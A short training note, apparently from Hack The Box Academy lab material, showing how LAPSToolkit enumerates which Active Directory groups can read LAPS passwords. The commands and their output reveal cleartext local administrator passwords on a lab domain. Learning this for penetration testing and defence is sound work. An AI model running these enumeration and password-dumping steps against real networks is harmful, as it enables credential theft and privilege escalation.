LAPSToolkit
###########

Date: 2024-12-19 14:13:36

Status: 

Tags:

Description
*************

Functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments 
that have deployed Microsoft's Local Administrator Password Solution (LAPS). It includes finding groups specifically 
delegated by sysadmins, finding users with "All Extended Rights" that can view passwords, and viewing all computers with LAPS enabled.

The following command can help us target specific AD users who can read LAPS passwords.

Using Find-LAPSDelegatedGroups
*******************************

.. code-block:: powershell

    PS C:\htb> Find-LAPSDelegatedGroups

    OrgUnit                                             Delegated Groups
    -------                                             ----------------
    OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
    OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
    OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
    OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
    OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
    OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
    OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
    OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
    OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
    OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
    OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
    OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
    OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
    OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
    OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
    OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
    OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
    OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins


The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups 
with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords 
and may be less protected than users in delegated groups, so this is worth checking for.

Using Find-AdmPwdExtendedRights
*******************************

.. code-block:: powershell

    PS C:\htb> Find-AdmPwdExtendedRights

    ComputerName                Identity                    Reason
    ------------                --------                    ------
    EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
    EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
    SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
    SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
    WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
    WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated


We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, 
and even the randomized passwords in cleartext if our user has access.

.. code-block:: powershell

    PS C:\htb> Get-LAPSComputers

    ComputerName                Password       Expiration
    ------------                --------       ----------
    DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
    EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
    SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
    WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04


References
***************
https://github.com/leoloobeek/LAPSToolkit
https://academy.hackthebox.com/module/143/section/1459
